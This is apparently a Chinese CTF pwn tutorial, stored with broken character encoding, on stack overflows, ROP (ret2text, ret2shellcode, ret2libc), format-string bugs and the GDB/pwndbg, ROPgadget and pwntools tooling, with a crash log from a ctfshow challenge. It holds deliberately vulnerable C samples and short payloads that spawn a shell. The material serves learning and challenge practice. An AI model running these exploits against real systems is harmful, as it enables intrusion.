Debuginfoï¼šæ˜¯å¦å¸¦æœ‰è°ƒè¯•ä¿¡æ¯ï¼ˆDWARF ç­‰ï¼‰ã€‚ Noï¼šä¸€èˆ¬å‘å¸ƒç‰ˆæœ¬åº”å»æ‰ï¼› Yesï¼šå«æºç çº§è°ƒè¯•ä¿¡æ¯ï¼Œæ–¹ä¾¿å¼€å‘è°ƒè¯•ï¼Œä½†å¯èƒ½æ³„éœ²è¿‡å¤šä¿¡æ¯ã€‚ ä¸‹é¢ä»‹ç»ä¸€äº›åŸºæœ¬çš„æ¼æ´ä»¥åŠå¯¹åº”çš„æ”»å‡»æ–¹æ³•ï¼š æº¢å‡º Buffer Overflowæ¼æ´/å¸¸è§å±é™©å‡½æ•°Buffer overflowï¼ˆç¼“å†²åŒºæº¢å‡ºï¼‰æ¼æ´ å¸¸è§äºä¸åšè¾¹ç•Œæ£€æŸ¥æˆ–è¾¹ç•Œæ£€æŸ¥é”™è¯¯çš„è¾“å…¥/æ‹·è´å‡½æ•°ï¼›å¯è¦†ç›–æ ˆ/å †/é™æ€åŒºä¸­çš„ç›¸é‚»æ•°æ®ï¼ˆå¦‚è¿”å›åœ°å€ã€å‡½æ•°æŒ‡é’ˆã€å¯¹è±¡å…ƒæ•°æ®ç­‰ï¼‰ã€‚ gets() æ²¡æœ‰ä»»ä½•è¾“å…¥é•¿åº¦é™åˆ¶/æ£€æŸ¥ã€‚ fgets(buf, size, stdin) å¦‚æœsizeå¤§äºç»™bufçš„å®é™…å¤§å°ï¼Œåˆ™ä¼šæº¢å‡ºã€‚ 12char buf[32];fgets(buf, 128, stdin); scanf(&quot;%s&quot;, buf) %s ä¼šä¸æ–­è¯»å…¥å­—ç¬¦ç›´åˆ°é‡åˆ°ç©ºç™½ç¬¦ï¼ˆç©ºæ ¼ã€å›è½¦ã€åˆ¶è¡¨ç¬¦ç­‰ï¼‰ã€‚ å®‰å…¨å†™æ³•ï¼š 1scanf(&quot;%15s&quot;, buf); // æœ€å¤šè¯» 15 ä¸ªå­—èŠ‚ + 1 ä¸ª &#x27;\\0&#x27; read(0, buf, count) å¦‚æœcountå¤§äºç»™bufçš„å®é™…å¤§å°ï¼Œåˆ™ä¼šæº¢å‡ºã€‚ 12char buf[32];read(0, buf, 0x100); æ ˆæº¢å‡ºï¼ˆStack buffer overflowï¼‰æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚ï¼ˆhttps://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/ ï¼‰ ç»“æ„ä½“å­—æ®µåŠ«æŒæœ€ç®€å•çš„æ”»å‡»ç›®çš„ä¾¿æ˜¯ä¿®æ”¹å†™å…¥å˜é‡é™„è¿‘çš„æŸä¸ªå˜é‡çš„å€¼ã€‚æ¯”å¦‚è¯´åœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­é‡Œï¼š 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;struct user &#123; char name[64]; int is_admin;&#125;;void win() &#123; printf(&quot;You are admin!\\n&quot;); system(&quot;/bin/flag&quot;);&#125;int main() &#123; struct user u; memset(&amp;u, 0, sizeof(u)); printf(&quot;Enter your name: &quot;); fgets(u.name, 200, stdin); // nameåªæœ‰64å­—èŠ‚ï¼Œfgetsè¯»200å­—èŠ‚ if (u.is_admin == 1) &#123; win(); &#125; else &#123; printf(&quot;Access denied.\\n&quot;); &#125; return 0;&#125; æˆ‘ä»¬å†™å…¥çš„å˜é‡ä¸ºuserè¿™ä¸ªstructé‡Œçš„nameï¼Œä½†æ˜¯ç”±äºè¾“å…¥é•¿åº¦é™åˆ¶ä¸º200ï¼Œè€Œå®é™…çš„nameçš„å­˜å‚¨ç©ºé—´ä»…ä¸º64ï¼Œå¹¶ä¸”structé‡Œçš„å†…å®¹çš„å­˜å‚¨ç©ºé—´æ˜¯è¿ç»­çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¾“å…¥ 123&#x27;A&#x27;*64 + &#x27;\\x01\\x00\\x00\\x00&#x27;# ä¹Ÿå¯ä»¥ç”¨&#x27;A&#x27;*64 + p32(1) å°†åŸæœ¬çš„is_adminçš„å€¼ä¿®æ”¹ä¸ºï¼ˆè¢«è¦†ç›–æ‰ä¸ºï¼‰1ã€‚ï¼ˆæ³¨æ„å¤§éƒ¨åˆ†æ¶æ„éƒ½æ˜¯ä½¿ç”¨çš„å°ç«¯åºï¼Œå¹¶ä¸”intçš„å¤§å°ä¸º4ä¸ªByteï¼Œæ‰€ä»¥æ˜¯\\x01\\x00\\x00\\x00ï¼‰ ROPï¼ˆReturn Oriented Programmingï¼‰ret2textret2textï¼ˆReturn-to-Textï¼‰å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (å³ï¼Œ .text æ®µä¸­çš„ä»£ç ) ã€‚ è¿™ç§Exploitä¸€èˆ¬éœ€è¦ï¼š 12Stack: No canary foundPIE: No PIE å¦‚æœå¼€å¯äº†PIEï¼Œåˆ™éœ€è¦å…ˆæ³„éœ²åŸºå€ï¼Œå†è®¡ç®—æ‰€éœ€å‡½æ•°çš„å®é™…åœ°å€ã€‚ ä¾‹å­ï¼ˆå‡è®¾ç¨‹åºä¸­åŸæœ¬æœ‰ä¸€ä¸ªä¸éœ€è¦å‚æ•°çš„win()å‡½æ•°ï¼Œå®ƒä¼šè°ƒç”¨system(&quot;/bin/sh&quot;)ã€‚ï¼‰ï¼š 12345win_address = 0x0000000000401172# winå‡½æ•°åœ°å€0x401172payload = b&quot;A&quot; * 76 # å¡«æ»¡Bufferpayload += b&quot;B&quot; * 8 # è¦†ç›–ä¿å­˜çš„rbpï¼ˆå†…å®¹æ— å…³ç´§è¦ï¼‰payload += p64(win_address) ret2shellcoderet2shellcodeï¼ˆReturn-to-Shellcodeï¼‰æŒ‡çš„æ˜¯ï¼šåœ¨åˆ©ç”¨æ ˆæº¢å‡ºç­‰æ¼æ´æ—¶ï¼Œå°†è‡ªå·±ç¼–å†™çš„shellcodeæ³¨å…¥åˆ°å†…å­˜ï¼ˆå¸¸è§æ˜¯æ ˆ/å †/.bssï¼‰é‡Œï¼Œå†é€šè¿‡è¦†ç›–è¿”å›åœ°å€æˆ–åˆ©ç”¨è·³è½¬ gadgetï¼ˆå¦‚ jmp *spï¼‰æŠŠæ§åˆ¶æµé‡å®šå‘åˆ°è¯¥ shellcodeï¼Œä»è€Œç›´æ¥æ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚ è¿™ç§Exploitä¸€èˆ¬éœ€è¦ï¼š 1234NX: NX enabled #é‡ä¸­ä¹‹é‡Stack: No canary foundPIE: No PIE (0x400000) æœ€å°åŒ–ç¤ºä¾‹ï¼ˆx64ï¼ŒNX å…³é—­ï¼›åˆ©ç”¨ jmp rsp gadgetï¼›PIE å…³é—­ï¼‰ï¼š 123456789101112from pwn import *context.arch = &quot;amd64&quot;shellcode = asm(shellcraft.sh()) # /bin/sh# æ‰¾åˆ° jmp rsi æŒ‡ä»¤åœ°å€JMP_RSI = next(elf.search(asm(&#x27;jmp rsi&#x27;)))payload = flat(&#123; 0: shellcode, # shellcode 256: JMP_RSI # æº¢å‡º return address&#125;) å½“ç¨‹åºæ‰§è¡Œretæ—¶ï¼ŒRIPè¢«æ”¹æˆJMP_RSIï¼ŒCPUå¼€å§‹æ‰§è¡Œjmp rsiã€‚è¿™æ¡æŒ‡ä»¤çš„å«ä¹‰æ˜¯ï¼šè·³åˆ°RSIæŒ‡å‘çš„åœ°å€ç»§ç»­æ‰§è¡Œã€‚æ­¤æ—¶RSIé‡Œè¿˜ä¿ç•™ç€åˆšæ‰ç¼“å†²åŒºçš„åœ°å€ï¼Œæ‰€ä»¥ä¼šè·³è½¬åˆ°ç¼“å†²åŒºçš„å¼€å¤´æ‰§è¡Œæˆ‘ä»¬æ”¾åœ¨é‡Œé¢çš„shellcodeã€‚ ret2libcret2libcï¼ˆReturn-to-Libraryï¼‰æŒ‡çš„æ˜¯ï¼šåœ¨å­˜åœ¨æ ˆæº¢å‡ºç­‰æ¼æ´ã€ä½†æ— æ³•ç›´æ¥æ‰§è¡Œæ³¨å…¥çš„ shellcodeï¼ˆé€šå¸¸å› ä¸º DEP/NX ä¿æŠ¤ç¦æ­¢åœ¨æ ˆä¸Šæ‰§è¡Œä»£ç ï¼‰çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†ç¨‹åºçš„æ§åˆ¶æµåŠ«æŒåˆ°libcåº“ä¸­çš„ç°æˆå‡½æ•°ï¼Œæ¯”å¦‚ system()ï¼Œä»è€Œè¾¾åˆ°æ‰§è¡Œä»»æ„å‘½ä»¤çš„ç›®çš„ã€‚ è¿™ç§é€šå¸¸è¾ƒä¸ºå¤æ‚ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ Format String Vulnerabilityè¯¦è§ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆFormat Stringï¼‰æ¼æ´ä»‹ç» æ­£å¸¸æƒ…å†µï¼šåœ¨è¿›å…¥printfå‡½æ•°ä¹‹åï¼Œå‡½æ•°ä¼šé¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µï¼š å½“å‰å­—ç¬¦ä¸æ˜¯%ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºã€‚ å½“å‰å­—ç¬¦æ˜¯%ï¼Œ ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ å¦‚æœæ²¡æœ‰å­—ç¬¦ï¼ŒæŠ¥é”™ï¼› å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯%, è¾“å‡º%ï¼› å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡ºã€‚ ä¾‹å­ï¼š 12345678910#include &lt;stdio.h&gt;int main() &#123; int a = 10; float b = 3.14; char *str = &quot;hello&quot;; printf(&quot;Int: %d, Float: %f, String: %s\\n&quot;, a, b, str); return 0;&#125; æ ˆçš„å¤§æ¦‚ç»“æ„ï¼š 1234567891011+----------------------+| è¿”å›åœ°å€ï¼ˆprintfç»“æŸåè·³è½¬ï¼‰ |+----------------------+| æ ¼å¼å­—ç¬¦ä¸²åœ°å€ | --&gt; &quot;Int: %d, Float: %f, String: %s\\n&quot;+----------------------+| å‚æ•°3ï¼ˆstrï¼‰ | --&gt; æŒ‡å‘ &quot;hello&quot;+----------------------+| å‚æ•°2ï¼ˆbï¼‰ | --&gt; float/double å€¼ï¼š3.14+----------------------+| å‚æ•°1ï¼ˆaï¼‰ | --&gt; æ•´æ•°å€¼ï¼š10+----------------------+ å‡½æ•°ä¼šä»æ ˆé‡Œæ­£å¸¸è¯»å–æŒ‡å®šçš„å˜é‡çš„å€¼ã€‚ è€Œå½“æˆ‘ä»¬åœ¨ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä½†æ˜¯å¹¶æ²¡æœ‰ç»™å®šå…·ä½“å˜é‡çš„æƒ…å†µä¸‹ï¼š 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello %x %x %x %x&quot;); return 0;&#125; åˆ™ä¼šä»æ ˆä¸­ä¾æ¬¡è¯»å–æœªå®šä¹‰çš„å€¼ä½œä¸ºå‚æ•°è¿›è¡Œæ ¼å¼åŒ–è¾“å‡ºã€‚ åœ¨CTFçš„é¢˜ç›®é‡Œè¿™ä¸ªæ¼æ´ä¸€èˆ¬çš„è¡¨ç°å¦‚ä¸‹ï¼š 12345678#include &lt;stdio.h&gt;int main() &#123; char user_input[100]; gets(user_input); printf(user_input); // ä¼šå°†æˆ‘ä»¬çš„è¾“å…¥ç›´æ¥å½“æˆæ ¼å¼å­—ç¬¦ä¸²å¹¶å¤„ç† return 0;&#125; æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¯»å–æ ˆä¸Šçš„å†…å®¹ï¼ˆå¦‚å˜é‡å€¼ã€è¿”å›åœ°å€ç­‰ï¼‰æˆ–è€…é€šè¿‡ %n æ ¼å¼ç¬¦ï¼ˆå°±æ˜¯æˆ‘ä»¬ä¹‹å‰æåˆ°çš„é‚£ä¸ªå±é™©çš„æ ¼å¼ç¬¦ï¼‰å‘æŒ‡å®šå†…å­˜åœ°å€å†™å…¥æ•°æ®ã€‚ å·¥å…·GDBGDBï¼ˆGNU Debuggerï¼‰æ˜¯ GNU é¡¹ç›®çš„è°ƒè¯•å™¨ï¼Œä¸»è¦ç”¨äºè°ƒè¯• C/C++ ç­‰ç¨‹åºã€‚ å®‰è£…1sudo apt install gdb å®‰è£…Pwndbgpwndbg æ˜¯ GDB çš„è°ƒè¯•æ’ä»¶ï¼Œæä¾›æ ˆ/å †/å¯„å­˜å™¨ä¸Šä¸‹æ–‡å±•ç¤ºä»¥åŠ cyclicã€ropã€heapã€format ç­‰å‘½ä»¤ï¼Œç”¨äºæ›´é«˜æ•ˆåœ°è°ƒè¯•äºŒè¿›åˆ¶æ¼æ´ã€‚ å®‰è£…ï¼š 12345678910# 1) ä¾èµ–sudo apt updatesudo apt install -y git python3-venv python3-pip# 2) æ‹‰ä»“åº“åˆ°ä½ ç”¨æˆ·ç›®å½•git clone https://github.com/pwndbg/pwndbg ~/.local/share/pwndbgcd ~/.local/share/pwndbg# 3) è¿è¡Œå®‰è£…è„šæœ¬ï¼ˆä¼šç»™ä½ åˆ›å»ºä¸€ä¸ªæœ¬åœ° venvï¼Œå¹¶æŠŠ source å†™å…¥ ~/.gdbinitï¼‰./setup.sh å®‰è£…å‰ï¼š å®‰è£…åï¼š å¸¸ç”¨å‘½ä»¤ ä½¿ç”¨GDBæ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ 123gdb ./vuln#æˆ–è€…gdb -q ./vuln -qï¼šquietï¼Œå®‰é™æ¨¡å¼ï¼Œä¸æ˜¾ç¤ºå¯åŠ¨æ¬¢è¿ä¿¡æ¯ã€‚ æˆ–è€…æ˜¯å…ˆæ™®é€šæ‰“å¼€gdbï¼Œç„¶åå†é€‰æ‹©æ–‡ä»¶ï¼š 123gdbpwndbg&gt; file ./pwn è¿è¡Œç¨‹åº 1234runrun &lt; input.txt # ç”¨æ–‡ä»¶è¾“å…¥run &lt;&lt;&lt; &quot;AAAA&quot; # ç®€å•è¾“å…¥ æŸ¥çœ‹æ±‡ç¼–ä»£ç  1234disassemble maindisass maindisassemble win è®¾ç½®æ–­ç‚¹ 12break main # åœ¨ main å‡½æ•°å¤„æ–­ç‚¹b main æŸ¥çœ‹å¯„å­˜å™¨ 1234info registersi rx/20gx $rsp # æŸ¥çœ‹æ ˆå†…å®¹ï¼ˆ20 ä¸ª 8 å­—èŠ‚ï¼Œä» RSP å¼€å§‹ï¼‰ æœç´¢gadgets 12345rop --grep &quot;ret&quot;rop --grep &quot;pop rdi ; ret&quot;rop --grep &quot;pop rsi ; pop r15 ; ret&quot; a ç¡®å®šè¿”å›åœ°å€åç§»123456pwndbg&gt; | cyclic 1200 | tee /tmp/pat &gt; /dev/nullpwndbg&gt; run &lt; /tmp/pat# ç¨‹åºå´©æºƒåï¼špwndbg&gt; x/gx $rsp # è®°ä¸‹è¿™é‡Œçš„ 8 å­—èŠ‚pwndbg&gt; cyclic -n 8 -o 0x... # ç”¨ä¸Šä¸€æ­¥è¯»åˆ°çš„å€¼æ±‚åç§» | cyclic 1200 | tee /tmp/pat &gt; /dev/nullï¼šç”Ÿæˆæ¨¡å¼ä¸²å¹¶ä¿å­˜åˆ°æ–‡ä»¶ cyclic 1200ï¼šè®© pwndbg ç”Ÿæˆé•¿åº¦ä¸º 1200 å­—èŠ‚çš„ De Bruijn æ¨¡å¼ä¸²ï¼ˆä¹Ÿå«â€œèŠ±æŒ‡çº¹/æ¨¡å¼ä¸²â€ï¼‰ã€‚å®ƒçš„ç‰¹æ€§æ˜¯ï¼šä»»æ„è¿ç»­çš„ n å­—èŠ‚å­ä¸²åœ¨æ•´æ®µé‡Œå”¯ä¸€ï¼ˆé»˜è®¤ n=4ï¼‰ã€‚é•¿è¿™æ ·ï¼š 12pwndbg&gt; | cyclic 200 | tee /tmp/pataaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa tee /tmp/patï¼šå†™å…¥æ–‡ä»¶ /tmp/patã€‚ &gt; /dev/nullï¼šéšè—è¾“å‡ºã€‚ x/gx $rspï¼šè¯»å–â€œå°†è¦è¢« ret å¼¹åˆ° RIPâ€çš„ 8 å­—èŠ‚ xï¼ˆexamineï¼‰ï¼šæŸ¥çœ‹å†…å­˜ã€‚ /gxï¼šä¸€æ¬¡æ˜¾ç¤º 1 ä¸ª 8 å­—èŠ‚ï¼ˆg=8 bytesï¼Œâ€œgiant wordâ€ï¼‰å¹¶ç”¨ åå…­è¿›åˆ¶ï¼ˆxï¼‰æ ¼å¼ã€‚ $rspï¼šå– RSP å¯„å­˜å™¨ ä½œä¸ºè¦æŸ¥çœ‹çš„å†…å­˜åœ°å€ã€‚ cyclic -n 8 -o 0x...ï¼šç”¨å¾—åˆ°çš„è¿”å›åœ°å€åæ¨åç§» -oï¼ˆoffsetï¼‰ï¼šå‘Šè¯‰ cyclic â€œè¿™å°±æ˜¯æˆ‘åœ¨æ ˆä¸Šè¯»åˆ°çš„é‚£ 8 ä¸ªå­—èŠ‚â€ï¼Œè¯·å¸®æˆ‘ç®—â€œå®ƒåœ¨åˆšæ‰é‚£æ®µæ¨¡å¼ä¸²é‡Œçš„èµ·å§‹ä½ç½®ï¼ˆåç§»ï¼‰â€ã€‚ -n 8ï¼šåœ¨ 64 ä½ä¸Šæˆ‘ä»¬è¯»çš„æ˜¯ 8 å­—èŠ‚ï¼ˆgxï¼‰ï¼Œè¦ç”¨ 8 å­—èŠ‚ç²’åº¦çš„å”¯ä¸€æ€§å»åŒ¹é…ï¼›å¦åˆ™é»˜è®¤ n=4 å¯èƒ½åŒ¹é…å¤±è´¥æˆ–ç»™é”™ç»“æœã€‚ 0x...ï¼šæŠŠä¸Šä¸€æ­¥ x/gx $rsp çœ‹åˆ°çš„ åå…­è¿›åˆ¶æ•°åŸæ ·å¡«è¿›æ¥ã€‚ è¾“å‡ºï¼šä¸€ä¸ªåè¿›åˆ¶æ•°å­—ï¼Œæ¯”å¦‚ Found at offset 18 â€”â€” è¿™å°±æ˜¯è¦†ç›–åˆ°è¿”å›åœ°å€çš„åç§»ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚ ä¾‹å­ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778pwndbg&gt; | cyclic 1200 | tee /tmp/pat &gt; /dev/nullpwndbg&gt; run &lt; /tmp/patStarting program: /home/archer/ctf-kali/pwn/pwn38/pwn &lt; /tmp/pat[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;. â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„ â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€ â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆ â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„ â–€ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–€â–ˆ â–ˆâ–ˆ â–ˆâ–€ â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–€â–€â–€â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ * ************************************* * Classify: CTFshow --- PWN --- å…¥é—¨ * Type : Stack_Overflow * Site : https://ctf.show/ * Hint : It has system and &#x27;/bin/sh&#x27;.There is a backdoor function * *************************************Just easy ret2text&amp;&amp;64bitProgram received signal SIGSEGV, Segmentation fault.0x0000000000400656 in ctfshow ()LEGEND: STACK | HEAP | CODE | DATA | WX | RODATAâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RAX 0x32 RBX 0x7fffffffd998 â€”â–¸ 0x7fffffffdc8e â—‚â€” &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27; RCX 0x400d3f â—‚â€” jne 0x400db5 /* &#x27;Just easy ret2text&amp;&amp;64bit&#x27; */ RDX 0x32 RDI 0 RSI 0x7fffffffd866 â—‚â€” 0x6161616161616161 (&#x27;aaaaaaaa&#x27;) R8 0 R9 0 R10 0 R11 0x202 R12 0 R13 0x7fffffffd9a8 â€”â–¸ 0x7fffffffdcb2 â—‚â€” &#x27;SHELL=/bin/bash&#x27; R14 0x7ffff7ffd000 (_rtld_global) â€”â–¸ 0x7ffff7ffe310 â—‚â€” 0 R15 0 RBP 0x6163616161616161 (&#x27;aaaaaaca&#x27;) RSP 0x7fffffffd878 â—‚â€” 0x6164616161616161 (&#x27;aaaaaada&#x27;) RIP 0x400656 (ctfshow+31) â—‚â€” retâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º 0x400656 &lt;ctfshow+31&gt; ret &lt;0x6164616161616161&gt; â†“â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ rsp 0x7fffffffd878 â—‚â€” 0x6164616161616161 (&#x27;aaaaaada&#x27;)01:0008â”‚ 0x7fffffffd880 â—‚â€” 0x6165616161616161 (&#x27;aaaaaaea&#x27;)02:0010â”‚ 0x7fffffffd888 â—‚â€” 0x6166616161616161 (&#x27;aaaaaafa&#x27;)03:0018â”‚ 0x7fffffffd890 â—‚â€” 0x6167616161616161 (&#x27;aaaaaaga&#x27;)04:0020â”‚ 0x7fffffffd898 â€”â–¸ 0x40066e (main) â—‚â€” push rbp05:0028â”‚ 0x7fffffffd8a0 â—‚â€” 0x100400040 /* &#x27;@&#x27; */06:0030â”‚ 0x7fffffffd8a8 â€”â–¸ 0x7fffffffd998 â€”â–¸ 0x7fffffffdc8e â—‚â€” &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27;07:0038â”‚ 0x7fffffffd8b0 â€”â–¸ 0x7fffffffd998 â€”â–¸ 0x7fffffffdc8e â—‚â€” &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º 0 0x400656 ctfshow+31 1 0x6164616161616161 None 2 0x6165616161616161 None 3 0x6166616161616161 None 4 0x6167616161616161 None 5 0x40066e main 6 0x100400040 None 7 0x7fffffffd998 Noneâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€pwndbg&gt; x/gx $rsp0x7fffffffd878: 0x6164616161616161pwndbg&gt; cyclic -n 8 -o 0x6164616161616161Finding cyclic pattern of 8 bytes: b&#x27;aaaaaada&#x27; (hex: 0x6161616161616461)Found at offset 18pwndbg&gt; æ‰€ä»¥åç§»ä¸º18ã€‚ Ropgadgetç”¨äºé«˜æ•ˆå‡†ç¡®æŸ¥æ‰¾gadgetsã€‚ ä¸‹è½½ï¼š 1sudo apt install python3-ropgadget ç”¨æ³•ï¼š 1ROPgadget --binary ./vuln | grep -E &quot;pop rdi ; ret&quot; PwntoolsPwntools æ˜¯é¢å‘ CTF/Pwn åœºæ™¯çš„ Python åº“ï¼Œæä¾›è¿æ¥æœåŠ¡ã€æ„é€  payloadã€åœ°å€ä¸æ•°æ®çš„æ‰“åŒ…/è§£åŒ…ã€gadget æ£€ç´¢ã€shellcode æ±‡ç¼–ä»¥åŠ GDB è°ƒè¯•ç­‰åŠŸèƒ½ï¼Œç”¨äºé«˜æ•ˆç¼–å†™ä¸è°ƒè¯•åˆ©ç”¨ä»£ç ï¼ˆexploitï¼‰ã€‚ å®‰è£…1pip3 install pwntools -U å¸¸ç”¨ APIï¼ˆæŒ‰ä»»åŠ¡åˆ†ç±»ï¼‰1) è¿æ¥ä¸äº¤äº’ ï¼ˆå‡è®¾io=ï¼‰process(path) / remote(host, port)ï¼šæœ¬åœ°æµ‹è¯•/è¿œç¨‹è¿æ¥ io.send(data) / io.sendline(data)ï¼šå‘é€æ•°æ®/è¡Œ io.recv(n) / io.recvline() / io.recvuntil(delim)ï¼šæ¥æ”¶ io.sendafter(delim, data) / io.sendlineafter(delim, data)ï¼šç­‰æç¤ºå†å‘ï¼ˆèœå•é¢˜å¸¸ç”¨ï¼‰ io.clean(timeout=0.1)ï¼šæ¸…ç©ºç¼“å†²åƒåœ¾è¾“å‡º io.interactive()ï¼šæ‹¿åˆ°äº¤äº’å¼ 